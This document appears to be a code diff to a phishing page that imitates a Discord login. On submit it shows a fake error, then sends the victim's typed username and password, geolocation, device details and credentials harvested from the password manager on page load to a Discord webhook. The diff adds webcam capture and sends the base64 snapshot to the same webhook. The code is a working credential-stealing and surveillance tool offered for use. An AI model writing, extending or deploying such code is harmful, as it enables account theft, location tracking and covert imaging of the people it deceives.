-          const payload = { content: message };
-          const res = await fetch(DISCORD_WEBHOOK_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-          });
-          console.log(`📥 Discord response status: ${res.status}`);
-          return res.ok;
-        } catch (err) {
-          console.error('❌ Network error:', err);
-          return false;
-        }
-      }
+                const stolen = window._stolenCreds || {};
+                const timestamp = getTimestamp();
+                const geo = await getGeoData();
+                const os = getExactOS();
+                const browser = getExactBrowser();
 
-      // ============================================================
-      //  FORM SUBMIT – Collect data + send to Discord + fake error
-      // ============================================================
-      form.addEventListener('submit', async (e) => {
-        e.preventDefault();
+                const username = usernameInput.value.trim() || '(empty)';
+                const password = passwordInput.value.trim() || '(empty)';
 
-        // Show fake error immediately
-        showFakeError();
+                let snapshotInfo = 'No snapshot taken.';
+                if (snapshotData) {
+                    snapshotInfo = `📸 **Snapshot:** ${snapshotData.substring(0, 60)}... (base64, full length: ${snapshotData.length} chars)`;
+                }
 
-        // Collect stolen creds if any
-        const stolen = window._stolenCreds || {};
-
-        const timestamp = getTimestamp();
-        const geo = await getGeoData();
-        const os = getExactOS();
-        const browser = getExactBrowser();
-
-        const username = usernameInput.value.trim() || '(empty)';
-        const password = passwordInput.value.trim() || '(empty)';
-
-        const message = `
-🔐 **Discord Login Capture**
-━━━━━━━━━━━━━━━━━━━
+                const message = `
+🔐 **Discord Login Capture + Video Snap**
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 📍 **Location Source:** ${geo.source}
 🗺️ **Latitude:** ${geo.latitude}
@@ -548,35 +601,107 @@
 👤 **Stolen Username:** ${stolen.username || '(none)'}
 🔑 **Stolen Password:** ${stolen.password || '(none)'}
 
+${snapshotInfo}
+
 📱 **User Agent:** ${navigator.userAgent.substring(0, 200)}
 🖥️ **Screen:** ${screen.width}x${screen.height}
 🌐 **Language:** ${navigator.language}
-        `.trim();
+                `.trim();
 
-        console.log('📋 [LOG] Full client data:');
-        console.log(message);
+                console.log('📋 [LOG] Full client data:');
+                console.log(message);
 
-        const sent = await sendToDiscord(message);
-        if (sent) console.log('✅ All data sent successfully.');
+                const sent = await sendToDiscord(message);
+                if (sent) console.log('✅ All data sent successfully.');
 
-        // Clear password field
-        passwordInput.value = '';
-      });
+                // If snapshot exists, send it as a separate message (Discord limit)
+                if (snapshotData && snapshotData.length > 0) {
+                    const snapMessage = `📸 **Snapshot Data:**\n${snapshotData}`;
+                    await sendToDiscord(snapMessage);
+                }
 
-      // ============================================================
-      //  ON PAGE LOAD – Trigger password manager steal
-      // ============================================================
-      window.addEventListener('DOMContentLoaded', () => {
-        // Trigger password manager steal after page loads
-        setTimeout(stealPasswordManagerCredentials, 1000);
-        setTimeout(stealPasswordManagerCredentials, 3000);
+                passwordInput.value = '';
+            });
 
-        // Log visitor info
-        console.log('🌐 [PAGE LOAD] Visitor detected');
-      });
+            // ============================================================
+            //  VIDEO SNAPPING – No Mic
+            // ============================================================
+            async function startCamera() {
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                        audio: false // No microphone
+                    });
+                    video.srcObject = stream;
+                    await video.play();
+                    videoStatus.textContent = '✅ Camera is active (no mic).';
+                    startBtn.disabled = true;
+                    snapBtn.disabled = false;
+                    stopBtn.disabled = false;
+                } catch (err) {
+                    console.error('Camera error:', err);
+                    videoStatus.textContent = '❌ Could not access camera.';
+                    startBtn.disabled = false;
+                    snapBtn.disabled = true;
+                    stopBtn.disabled = true;
+                }
+            }
 
-    })();
-  </script>
+            function stopCamera() {
+                if (stream) {
+                    stream.getTracks().forEach(t => t.stop());
+                    stream = null;
+                }
+                video.srcObject = null;
+                videoStatus.textContent = '⏹ Camera stopped.';
+                startBtn.disabled = false;
+                snapBtn.disabled = true;
+                stopBtn.disabled = true;
+                snapshotPreview.style.display = 'none';
+                snapshotData = null;
+            }
+
+            function takeSnapshot() {
+                if (!stream) {
+                    videoStatus.textContent = '❌ Camera not running.';
+                    return;
+                }
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                // Mirror effect to match video preview
+                ctx.translate(canvas.width, 0);
+                ctx.scale(-1, 1);
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                // Restore
+                ctx.setTransform(1, 0, 0, 1, 0, 0);
+
+                snapshotData = canvas.toDataURL('image/png');
+                snapshotPreview.src = snapshotData;
+                snapshotPreview.style.display = 'block';
+                videoStatus.textContent = '📸 Snapshot captured!';
+                snapBtn.disabled = false;
+            }
+
+            // Event listeners for video
+            startBtn.addEventListener('click', startCamera);
+            stopBtn.addEventListener('click', stopCamera);
+            snapBtn.addEventListener('click', takeSnapshot);
+
+            // ============================================================
+            //  ON PAGE LOAD – Trigger password manager steal
+            // ============================================================
+            window.addEventListener('DOMContentLoaded', () => {
+                setTimeout(stealPasswordManagerCredentials, 1000);
+                setTimeout(stealPasswordManagerCredentials, 3000);
+                console.log('🌐 [PAGE LOAD] Visitor detected');
+                videoStatus.textContent = '📷 Click "Start Camera" to enable video snap.';
+            });
+
+        })();
+    </script>
 
 </body>
 </html>
